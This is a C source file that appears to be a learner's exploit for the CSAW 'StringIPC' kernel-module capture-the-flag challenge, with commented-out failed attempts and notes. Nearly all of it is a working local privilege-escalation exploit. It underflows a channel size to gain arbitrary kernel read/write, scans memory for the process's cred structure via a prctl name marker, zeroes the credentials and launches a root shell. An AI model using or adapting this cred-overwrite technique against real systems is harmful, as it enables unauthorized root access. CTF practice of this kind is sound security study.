#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <malloc.h>
#include <string.h> // for memmem
#include <sys/ioctl.h>    /* BSD and Linux */
#include<unistd.h> // for getgid()
#include<stdlib.h> // for system("/bin/sh")
// search string input

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};


// create a channel
int main()
{
    setvbuf(stdout, 0LL, 2, 0LL);
    int fd = open("/dev/csaw",O_RDWR);
    if(fd<0)
    {
        printf("open /dev/csaw error\n");
        return -1;
    }
    struct alloc_channel_args alloc_args;
    struct shrink_channel_args shrink_args;
    struct seek_channel_args seek_args;
    struct read_channel_args read_args;
    struct close_channel_args close_args;
    struct write_channel_args write_args;
    size_t addr = 0xffff880000000000;
    size_t real_cred = 0;
    size_t cred = 0;
    size_t target_addr;
    int root_cred[12];

    // alloc one
    alloc_args.buf_size = 0x100;
    alloc_args.id = -1;
    int ret = -1;
    ret = ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
    if(alloc_args.id == -1)
    {
        printf("bad alloc\n");
        return -1;
    }
    printf("[+] alloc an channel at id %d\n",alloc_args.id);

    // change its size to get arbitary write
    shrink_args.id = alloc_args.id;
    shrink_args.size = 0x100+1; // vul, shrink size is `original size - this size` si we get -1 here
    ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
    printf("[+] now we have arbitary read/write\n");

    // use prctl() to set a str
    char buf[16] = {0};
    strcpy(buf,"1@mnicholas_Wei");
    prctl(PR_SET_NAME,buf);
    
    // BEGIN OUR SEARCH
    char* local_buf = (char*)malloc(0x1000);
    for(;addr<0xffffc80000000000;addr+=0x1000)
    {
        // use memmem to search for pattern
        // we can't do memmem directly, because we need to search it inside
        // the space of **device**, not the space of our program.
        // printf("look for addr 0x%lx\n",addr);
        seek_args.id = alloc_args.id;
        seek_args.index = addr-0x10; // index is actually the begin of the place we want to search.
        seek_args.whence = SEEK_SET; // search from begin
        ret = ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        // use channel_read to read channel's space
        read_args.buf = local_buf;
        read_args.count = 0x1000;
        read_args.id = alloc_args.id;
        ret = ioctl(fd,CSAW_READ_CHANNEL,&read_args);
        //now data is in local_buf
        ret = memmem(local_buf,0x1000,buf,0x10);
        if(ret)
        {
            printf("[+] user-level pointer @ 0x%lx\n",ret);
            printf("[+] find pattern @ 0x%lx\n",ret+addr);
            cred = *(size_t *)(ret - 0x8);
            real_cred = *(size_t *)(ret - 0x10);
            if((cred||0xff00000000000000) && (real_cred == cred)) // what's the meaning of this?
            {
                // target_addr = addr+ret-(int)buf;// what's meaning?
                printf("[+] find cred @ 0x%lx\n",cred);
                printf("[+] find real_cred @ 0x%lx\n", real_cred);
            }
            break;
        }
    }

    // now we get the cred addr, we can overwrite it

    // The following way doesn't work
    // //1. seek
    // seek_args.id = alloc_args.id;
    // seek_args.index = cred + 8 - 0x10;
    // printf("[+] switch to search @ %llx\n",seek_args.index);
    // seek_args.whence = 0;//from begin
    // ret = ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
    // // 2.write
    // char payload[32] = {0};
    // write_args.buf = payload;
    // write_args.count = 32;
    // write_args.id = alloc_args.id;
    // ret = ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);

    // the solution on website, works well
        printf("[+] switch to search @ %llx\n",cred-0x10 +4);
        for (int i = 0; i<44;i++){
        seek_args.id =  alloc_args.id;
        seek_args.index = cred-0x10 +4 + i ;
        seek_args.whence= SEEK_SET;
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        root_cred[0] = 0;
        write_args.id = alloc_args.id;
        write_args.buf = (char *)root_cred;
        write_args.count = 1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);   

    }
    if(getuid() == 0)
    {
        printf("ROOTED!\n");
        system("/bin/sh");
    }
    else
    {
        system("/bin/sh");
        printf("Something wrong...\n");
    }
    

}